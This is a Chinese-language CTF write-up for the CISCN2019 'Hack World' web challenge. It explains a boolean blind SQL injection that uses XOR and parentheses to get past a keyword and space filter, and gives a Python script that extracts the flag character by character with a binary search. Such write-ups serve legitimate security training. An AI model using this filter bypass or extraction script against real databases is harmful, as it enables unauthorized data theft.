# \[CISCN2019 华北赛区 Day2 Web1]Hack World

## \[CISCN2019 华北赛区 Day2 Web1]Hack World

## 考点

* 布尔盲注
* 使用() bypass 空格

## wp

首先发现过滤了很多东西，union limit ord and xor information\_schema - & # \* ||\
发现没有过滤 ^ ，尝试输入参数1^0返回正常，1^1返回错误

然后尝试进行注入，输入 0^(ascii(substr((select(database())),1,1))>0) 返回正常，这也说明存在注入。题目也说明flag在flag表的flag字段，写脚本爆破即可。

```python
import requests

url = 'http://808a4f11-2371-4c63-a2f8-cc9d86102282.node3.buuoj.cn/index.php'

# 0^1返回 glzjin wants a girlfriend 
# 0^0返回 false
flag = ''
for i in range(1, 50):
    low = 32
    high = 126
    mid = (low+high)//2
    print(flag)
    
    while low < high:
        payload = f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"
        # print(payload)
        data = {
            'id': payload
        }
        
        r = requests.post(url=url, data=data)
        # print(r.text)
        if 'glzjin wants a girlfriend' in  r.text:
            low = mid + 1
        if 'Error' in r.text:
            high = mid
            
        mid = (low+high)//2
        
        if low == high:
            flag = flag + chr(low)
            break
    
```
